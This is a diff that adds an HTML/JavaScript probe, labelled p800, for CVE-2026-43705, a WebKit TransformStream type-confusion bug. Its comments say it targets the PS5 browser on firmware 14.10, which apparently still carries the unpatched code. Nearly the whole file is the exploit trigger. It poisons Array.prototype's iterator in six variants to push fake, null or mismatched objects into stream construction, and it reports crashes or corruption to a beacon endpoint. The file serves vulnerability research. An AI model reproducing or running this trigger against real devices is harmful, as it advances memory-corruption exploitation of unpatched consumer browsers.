@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>p800: CVE-2026-43705 TransformStream type confusion</title>
+</head>
+<body>
+<pre id="log"></pre>
+<script>
+// CRASH_CLASS: HIGH
+// PROBE p800: CVE-2026-43705 TransformStream type confusion
+//
+// Context: WebKit bug 314528. createInternalTransformStream uses
+// JS iteration to unpack [readable, writable, controller] from
+// the builtin result. Overriding Array.prototype[Symbol.iterator]
+// substitutes arbitrary objects. The code then calls
+// jsDynamicCast<JSReadableStream*> and jsDynamicCast<JSWritableStream*>
+// without null checks (ASSERT only, no-op in release builds).
+//
+// Fixed: commit 8fd92b1 (cdumez), Safari 26.5.2, June 2026.
+// Sony cherry-pick cutoff: Safari 26.3, February 2026.
+// PS5 14.10 should carry the vulnerable code.
+//
+// This probe tests:
+// A) TransformStream availability
+// B) The type confusion trigger (poisoned iterator)
+// C) Whether it crashes or produces observable corruption
+//
+// Evidence grade: [M] when run on device
+
+var L = document.getElementById('log');
+function log(s) {
+    L.textContent += s + '\n';
+    try { navigator.sendBeacon('/beacon', 'p800:' + s); } catch(e) {}
+}
+
+log('=== PROBE p800: CVE-2026-43705 TransformStream type confusion ===');
+log('Date: ' + new Date().toISOString());
+log('UA: ' + navigator.userAgent);
+log('');
+
+// Section A: TransformStream availability
+log('== A: TransformStream check ==');
+if (typeof TransformStream === 'undefined') {
+    log('TransformStream: ABSENT -- CVE is unreachable');
+    log('DEAD');
+} else {
+    log('TransformStream: PRESENT');
+
+    // Section B: Normal TransformStream construction (baseline)
+    log('');
+    log('== B: Baseline construction ==');
+    try {
+        var ts1 = new TransformStream();
+        log('new TransformStream(): OK');
+        log('readable: ' + (ts1.readable ? 'present' : 'absent'));
+        log('writable: ' + (ts1.writable ? 'present' : 'absent'));
+    } catch(e) {
+        log('Baseline FAILED: ' + e);
+    }
+
+    // Section C: Poisoned iterator -- the CVE trigger
+    log('');
+    log('== C: Poisoned iterator (CVE-2026-43705) ==');
+
+    // Save original
+    var origIter = Array.prototype[Symbol.iterator];
+    var poisonTriggered = false;
+
+    // Phase C1: Return wrong types (non-stream objects)
+    log('C1: iterator returns plain objects...');
+    try {
+        var fakeReadable = { locked: false, cancel: function(){}, getReader: function(){} };
+        var fakeWritable = { locked: false, abort: function(){}, getWriter: function(){} };
+        var fakeController = {};
+
+        Array.prototype[Symbol.iterator] = function() {
+            poisonTriggered = true;
+            var items = [fakeReadable, fakeWritable, fakeController];
+            var idx = 0;
+            return {
+                next: function() {
+                    if (idx < items.length) return { value: items[idx++], done: false };
+                    return { done: true };
+                }
+            };
+        };
+
+        var ts2 = new TransformStream();
+        log('C1 SURVIVED -- ts2.readable type: ' + typeof ts2.readable);
+        log('C1 ts2.readable === fakeReadable: ' + (ts2.readable === fakeReadable));
+        log('C1 ts2.writable === fakeWritable: ' + (ts2.writable === fakeWritable));
+        log('C1 poisonTriggered: ' + poisonTriggered);
+
+        // If our fake objects were accepted as real streams, that's
+        // type confusion -- the internal slots would be wrong
+        if (ts2.readable === fakeReadable) {
+            log('*** TYPE CONFUSION: fake object accepted as ReadableStream ***');
+        }
+    } catch(e) {
+        log('C1 threw: ' + e.name + ': ' + e.message);
+        // TypeError = patched (null check added)
+        // Other = interesting
+        if (e.name === 'TypeError') {
+            log('C1 PATCHED -- null check present');
+        }
+    } finally {
+        Array.prototype[Symbol.iterator] = origIter;
+    }
+
+    // Phase C2: Return fewer items (size check)
+    log('');
+    log('C2: iterator returns 1 item...');
+    poisonTriggered = false;
+    try {
+        Array.prototype[Symbol.iterator] = function() {
+            poisonTriggered = true;
+            var items = [42];
+            var idx = 0;
+            return {
+                next: function() {
+                    if (idx < items.length) return { value: items[idx++], done: false };
+                    return { done: true };
+                }
+            };
+        };
+
+        var ts3 = new TransformStream();
+        log('C2 SURVIVED -- readable: ' + ts3.readable);
+        log('C2 poisonTriggered: ' + poisonTriggered);
+    } catch(e) {
+        log('C2 threw: ' + e.name + ': ' + e.message);
+    } finally {
+        Array.prototype[Symbol.iterator] = origIter;
+    }
+
+    // Phase C3: Return null items
+    log('');
+    log('C3: iterator returns nulls...');
+    poisonTriggered = false;
+    try {
+        Array.prototype[Symbol.iterator] = function() {
+            poisonTriggered = true;
+            var items = [null, null, null];
+            var idx = 0;
+            return {
+                next: function() {
+                    if (idx < items.length) return { value: items[idx++], done: false };
+                    return { done: true };
+                }
+            };
+        };
+
+        var ts4 = new TransformStream();
+        log('C3 SURVIVED -- readable: ' + ts4.readable);
+    } catch(e) {
+        log('C3 threw: ' + e.name + ': ' + e.message);
+    } finally {
+        Array.prototype[Symbol.iterator] = origIter;
+    }
+
+    // Phase C4: Return a real ReadableStream but wrong WritableStream
+    log('');
+    log('C4: real ReadableStream + fake WritableStream...');
+    poisonTriggered = false;
+    try {
+        var realRS = new ReadableStream();
+        var fakeWS2 = { locked: false };
+
+        Array.prototype[Symbol.iterator] = function() {
+            poisonTriggered = true;
+            var items = [realRS, fakeWS2, {}];
+            var idx = 0;
+            return {
+                next: function() {
+                    if (idx < items.length) return { value: items[idx++], done: false };
+                    return { done: true };
+                }
+            };
+        };
+
+        var ts5 = new TransformStream();
+        log('C4 SURVIVED -- ts5.writable === fakeWS2: ' + (ts5.writable === fakeWS2));
+        if (ts5.writable === fakeWS2) {
+            log('*** PARTIAL TYPE CONFUSION: fake writable accepted ***');
+        }
+    } catch(e) {
+        log('C4 threw: ' + e.name + ': ' + e.message);
+    } finally {
+        Array.prototype[Symbol.iterator] = origIter;
+    }
+
+    // Phase C5: Return extra items
+    log('');
+    log('C5: iterator returns 10 items...');
+    try {
+        Array.prototype[Symbol.iterator] = function() {
+            var items = [1,2,3,4,5,6,7,8,9,10];
+            var idx = 0;
+            return {
+                next: function() {
+                    if (idx < items.length) return { value: items[idx++], done: false };
+                    return { done: true };
+                }
+            };
+        };
+
+        var ts6 = new TransformStream();
+        log('C5 SURVIVED -- readable: ' + ts6.readable);
+    } catch(e) {
+        log('C5 threw: ' + e.name + ': ' + e.message);
+    } finally {
+        Array.prototype[Symbol.iterator] = origIter;
+    }
+
+    // Phase C6: Return undefined (test jsDynamicCast on undefined)
+    log('');
+    log('C6: iterator returns undefined items...');
+    try {
+        Array.prototype[Symbol.iterator] = function() {
+            var items = [undefined, undefined, undefined];
+            var idx = 0;
+            return {
+                next: function() {
+                    if (idx < items.length) return { value: items[idx++], done: false };
+                    return { done: true };
+                }
+            };
+        };
+
+        var ts7 = new TransformStream();
+        log('C6 SURVIVED -- readable: ' + ts7.readable);
+    } catch(e) {
+        log('C6 threw: ' + e.name + ': ' + e.message);
+    } finally {
+        Array.prototype[Symbol.iterator] = origIter;
+    }
+
+    // Final verification: iterator is restored
+    log('');
+    log('== D: Post-test verification ==');
+    try {
+        var arr = [1,2,3];
+        var sum = 0;
+        for (var v of arr) sum += v;
+        log('Iterator restored: sum=' + sum + ' (expect 6)');
+    } catch(e) {
+        log('Iterator restore FAILED: ' + e);
+    }
+}
+
+log('');
+log('=== p800 COMPLETE ===');
+</script>
+</body>
+</html>
